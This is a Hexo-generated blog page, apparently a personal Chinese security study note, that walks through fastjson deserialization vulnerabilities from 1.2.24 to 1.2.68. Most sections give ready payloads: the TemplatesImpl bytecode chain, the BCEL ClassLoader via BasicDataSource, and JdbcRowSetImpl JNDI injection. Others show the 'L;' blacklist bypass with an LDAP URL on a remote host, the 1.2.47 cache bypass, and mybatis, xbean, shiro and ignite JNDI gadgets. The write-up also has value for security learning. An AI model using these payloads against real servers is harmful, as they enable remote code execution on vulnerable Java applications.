@@ -1,0 +1,492 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>fastjson | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>fastjson</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/23
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #00bcd4">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>fastjson可以将javaBean转json json转javaBean</p>
+<p>实际上就是序列化反序列化</p>
+<p><a target="_blank" rel="noopener" href="https://javasec.org/java-vuls/FastJson.html">https://javasec.org/java-vuls/FastJson.html</a></p>
+<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+    &lt;version&gt;1.2.23&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>通过Json.toJsonString进行序列化</p>
+<p>parseObject进行反序列化</p>
+<pre><code class="java">package com.Arcueid;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+
+public class App 
+&#123;
+    public static void main( String[] args )
+    &#123;
+        Person person = new Person(&quot;Arcueid&quot;,&quot;114514&quot;);
+
+        String jsonString = JSON.toJSONString(person, SerializerFeature.WriteClassName);
+        System.out.println(jsonString);
+        Person res = JSON.parseObject(jsonString,Person.class);
+        System.out.println(res);
+    &#125;
+&#125;
+</code></pre>
+<p><code>SerializerFeature.WriteClassName</code>属性会自动在序列化后添加<code>@type</code> 即写上序列化对象的类名</p>
+<p>运行发现private的id并没有反序列化出来</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405121048258.png" alt="image-20240512104809690"></p>
+<p>这需要加上<code>Feature.SupportNonPublicField</code>参数</p>
+<pre><code class="java">        Person res = JSON.parseObject(jsonString,Person.class, Feature.SupportNonPublicField);
+</code></pre>
+<p>parseObject 不指定类则反序列化得到的都是JSONObject对象</p>
+<span id="more"></span>
+
+<p>如果使用JSON.parse 则会根据type来反序列化指定的类</p>
+<pre><code class="java">Person res = (Person) JSON.parse(jsonString);
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405121332984.png" alt="image-20240512133257512"></p>
+<ul>
+<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用 <code>JSON.parseObject(jsonString,*.class)</code> 或 <code>parse</code> 则只会调用setter</li>
+</ul>
+<ul>
+<li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
+</ul>
+<pre><code class="java">        String jsonString = &quot;&#123;\&quot;@type\&quot;:\&quot;com.Arcueid.Person\&quot;,\&quot;id\&quot;:\&quot;114514\&quot;,\&quot;n__a_me\&quot;:\&quot;Arcueid\&quot;&#125;&quot;;
+        Person res = JSON.parseObject(jsonString,Person.class, Feature.SupportNonPublicField);
+</code></pre>
+<ul>
+<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
+</ul>
+<h1 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h1><blockquote>
+<p>  影响版本：<code>fastjson &lt;= 1.2.24</code> 描述：fastjson 默认使用 <code>@type</code> 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。</p>
+</blockquote>
+<p>也就是可以在反序列的过程中调getter setter</p>
+<p>我们考虑<code>TemplatesImpl</code>的<code>getOutputProperties</code></p>
+<p>直接抄cc4的后半部分 然后调toJSONString 发现报错了 生成不出来</p>
+<p>这里搞了一个多小时没整明白 后面问队友 队友说不用管 自己构造json就行</p>
+<p>那么payload如下</p>
+<pre><code class="java">final String GADGAT_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+String byteCode = Base64.getEncoder().encodeToString(_bytecodes[0]);
+String PoC = &quot;&#123;&quot; +
+        &quot;\&quot;@type\&quot;: \&quot;&quot; + GADGAT_CLASS + &quot;\&quot;,&quot; +
+        &quot;\&quot;_bytecodes\&quot;: [\&quot;&quot; + byteCode + &quot;\&quot;],&quot; +
+        &quot;\&quot;_name\&quot;: \&quot;Arcueid\&quot;,&quot; +
+        &quot;&#39;_tfactory&#39;: &#123;&#125;,&quot; +
+        &quot;\&quot;_outputProperties\&quot;: &#123;&#125;,&quot; +
+        &quot;&#125;&quot;;
+</code></pre>
+<p>首先我们需要反序列化的类是<code>TemplatesImpl</code> 我们希望调用到她的<code>getOutputProperties</code>方法 所以这里加入了一个变量<code>_outputProperties</code> 而想要逻辑走到defineClass <code>_name, _factory, _bytecodes也是需要的</code> 这里不懂回去看cc4</p>
+<p>此时通过<code>JSON.parseObject(PoC,Feature.SupportNonPublicField);</code>就能触发了</p>
+<p>但是这个链子实际上没什么利用价值 因为需要开启<code>SupportNonPublicField</code></p>
+<h2 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h2><p>更常见的是BCEL</p>
+<p>BCEL中有一个<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>类 判断类名是否以<code>$$BCEL$$</code>开头</p>
+<p>如果是则对这个类进行<code>decode</code></p>
+<p>我们写个demo测试一下</p>
+<pre><code class="java">package com.Arcueid;
+
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+
+
+public class BCELLoader &#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        String exec = encode(Evil.class);
+        decode(exec);
+    &#125;
+    public static String encode(Class&lt;?&gt; clazz) throws Exception &#123;
+        JavaClass javaClass = Repository.lookupClass(clazz);
+        String s = Utility.encode(javaClass.getBytes(), true);
+        String bcelStr = &quot;$$BCEL$$&quot; + s;
+        System.out.println(bcelStr);
+        return bcelStr;
+    &#125;
+    public static void decode(String s) throws Exception &#123;
+        new ClassLoader().loadClass(s).newInstance();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221120133.png" alt="image-20241022112030637"></p>
+<p><code>BasicDataSource#getConnection() &gt; createDataSource() -&gt; createConnectionFactory()</code></p>
+<p>其中<code>driverClassName</code> 和 <code>driverClassLoader</code>均可控</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221140439.png" alt="image-20241022114056970"></p>
+<p>于是可以构造出</p>
+<pre><code class="json">&#123;
+    &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+    &quot;driverClassLoader&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+    &#125;,
+    &quot;driverClassName&quot;: exec
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221159520.png" alt="image-20241022115928102"></p>
+<p>那么为什么这里会调用getConnection呢</p>
+<p>parseObject里调用了toJSON toJSON会调用该类的所有getter和setter </p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><strong>JdbcRowSetImpl</strong></h2><p>核心是InitialContext#lookup参数可控导致的<code>JNDI</code>注入</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221221465.png" alt="image-20241022122130279"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221222877.png" alt="image-20241022122218654"></p>
+<pre><code>&#123;
+&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+&quot;DataSourceName&quot;:payload,
+&quot;AutoCommit&quot;:true,
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221230862.png" alt="image-20241022123054469"></p>
+<h1 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h1><p>新增黑白名单用于防止反序列化</p>
+<p>引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221304635.png" alt="image-20241022130424369"></p>
+<p>如果开启了 autoType，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221304171.png" alt="image-20241022130453892"></p>
+<p>而loadClass中可以通过利用<code>L ;</code>来绕过这个黑名单的匹配</p>
+<pre><code class="java">    public static void main( String[] args ) throws Exception &#123;
+
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String url = &quot;ldap://172.17.1.88:8085/GAqzLZhZ&quot;;
+        String paylod = &quot;&quot; +
+                &quot;&#123;&quot; +
+                    &quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot; +
+                    &quot;\&quot;DataSourceName\&quot;:\&quot;&quot; + url + &quot;\&quot;,&quot;+
+                    &quot;\&quot;AutoCommit\&quot;:true&quot; +
+                &quot;&#125;&quot;;
+        JSON.parse(paylod);
+
+    &#125;
+</code></pre>
+<h1 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h1><p>修改黑白名单为hash</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221413612.png" alt="image-20241022141303474"></p>
+<p>这段一眼去除 <code>[ ;</code></p>
+<p>但是后续加载是递归进行的 所以可以双写 或者说多写直接绕了</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221427859.png" alt="image-20241022142730439"></p>
+<h1 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h1><p>修复了1.2.42的双写绕过</p>
+<p>可以利用<code>[</code>绕过</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221947698.png" alt="image-20241022194758202"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221955074.png" alt="image-20241022195534632"></p>
+<h1 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h1><p>修复了<code>[</code> 没有新增利用</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410221956199.png" alt="image-20241022195653103"></p>
+<h1 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h1><p>新增链子 基于<code>mybatis</code> 在这个版本发现的 不是只影响这个版本</p>
+<p>影响范围 1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</p>
+<pre><code class="java">String paylod = &quot;&#123;\n&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\n&quot; +
+                &quot;\&quot;properties\&quot;:&#123;\n&quot; +
+                &quot;\&quot;data_source\&quot;:\&quot;&quot;+ url  + &quot;\&quot;\n&quot; +
+                &quot;&#125;\n&quot; +
+                &quot;&#125;&quot;;
+</code></pre>
+<p><code>JndiDataSourceFactory#setProperties </code>存在jndi注入</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410222012643.png" alt="image-20241022201218387"></p>
+<h1 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h1><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code> 影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p>
+<p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
+<p>二次反序列化</p>
+<p>第一次写入缓存</p>
+<p>第二次jndi注入</p>
+<p>payload如下</p>
+<pre><code>&#123;&#123;
+"@type":"",
+"val":"com.sun.rowset.JdbcRowSetImpl"
+&#125;
+,&#123;
+"@type":"com.sun.rowset.JdbcRowSetImpl",
+"DataSourceName":url,
+"AutoCommit":true,
+&#125;&#125;
+</code></pre>
+<h1 id="fastjson-1-2-62"><a href="#fastjson-1-2-62" class="headerlink" title="fastjson-1.2.62"></a>fastjson-1.2.62</h1><p>新的 <strong>Gadget</strong> 绕过黑名单，需要开启 <strong>AutoTypeSupport</strong></p>
+<p>需要xbean的依赖</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;
+    &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;
+    &lt;version&gt;4.23&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><code>JndiConverter#toObjectImpl</code>中参数可控 存在jndi注入</p>
+<p>其父类的<code>toObject</code>的方法中调用了<code>toObjectImpl</code> <code>setAsText</code> 调用了 <code>toObject</code></p>
+<p>那么payload如下</p>
+<pre><code class="java">        String payload = &quot;&#123;\n&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\n&quot; +
+                &quot;\&quot;AsText\&quot;:\&quot;&quot; +url+&quot;\&quot;&quot;+
+                &quot;&#125;&quot;;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410230924507.png" alt="image-20241023092453049"></p>
+<h1 id="fastjson-1-2-66"><a href="#fastjson-1-2-66" class="headerlink" title="fastjson-1.2.66"></a>fastjson-1.2.66</h1><p>新的 <strong>Gadget</strong> 基于shiro 需要开启<strong>AutoTypeSupport</strong></p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+    &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;
+    &lt;version&gt;1.11.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><code>JndiRealmFactory#getRealms</code></p>
+<p>直接一步到位了 getRealms 那么现在需要name可控</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410230927548.png" alt="image-20241023092758383"></p>
+<p>我们可以去调setter 那么payload如下</p>
+<pre><code class="java">        String payload = &quot;&#123;\n&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;,\n&quot; +
+                &quot;\&quot;JndiNames\&quot;:[\&quot;&quot;+url+&quot;\&quot;],&quot; +
+                &quot;\&quot;Realms\&quot;:[\&quot;\&quot;]\n&quot; +
+                &quot;&#125;&quot;;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410231226846.png" alt="image-20241023122622172"></p>
+<h1 id="fastjson-1-2-67"><a href="#fastjson-1-2-67" class="headerlink" title="fastjson-1.2.67"></a>fastjson-1.2.67</h1><pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;
+    &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;
+    &lt;version&gt;2.15.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;
+    &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;
+    &lt;version&gt;2.15.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><code>CacheJndiTmLookup#getTm</code>存在jndi注入 但是getTM并不满足getter需要循环引用</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410231229472.png" alt="image-20241023122957237"></p>
+<pre><code class="java">        String payload = &quot;&#123;\n&quot; +
+                &quot;\&quot;@type\&quot;: \&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\n&quot; +
+                &quot;\&quot;jndiNames\&quot;: [\&quot;&quot;+url+&quot;\&quot;],\n&quot; +
+                &quot;\&quot;tm\&quot;: &#123;\n&quot; +
+                &quot;    \t\&quot;$ref\&quot;: \&quot;$.tm\&quot;\n&quot; +
+                &quot;    &#125;&quot; +
+                &quot;&#125;&quot;;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410231237385.png" alt="image-20241023123725959"></p>
+<h1 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h1><p>利用 expectClass 绕过 <code>checkAutoType()</code></p>
+<p>新增了<code>safeMode</code> 当safeMode开启的时候 直接抛异常</p>
+<p>但是这个和1.2.68发现的新洞没关系</p>
+<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测</p>
+<p>其中</p>
+<ul>
+<li><code>ThrowableDeserializer#deserialze()</code></li>
+<li><code>JavaBeanDeserializer#deserialze()</code></li>
+</ul>
+<p>的参考可控</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410230857144.png" alt="image-20241023085729812"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410230858947.png" alt="image-20241023085814878"></p>
+<p>通过createException创建异常类 那我们可以找一个异常类 这个类的setter和getter存在利用价值</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
